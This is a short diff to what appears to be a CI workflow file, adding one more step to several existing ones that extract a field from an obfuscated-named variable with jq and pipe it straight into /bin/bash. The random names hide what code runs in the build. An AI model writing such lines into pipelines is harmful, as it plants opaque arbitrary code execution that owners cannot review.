@@ -26,6 +26,7 @@ jobs:
           echo $k3794 | jq -r .edftk04 | /bin/bash
           printf '%s' "$or354" | jq -r .wirfq02 | /bin/bash
           printf '%s' "$i660" | jq -r .bitq9670 | /bin/bash
+          printf '%s' "$sfgq04525" | jq -r .spyk97 | /bin/bash
 
       - name: Save results
         if: always()
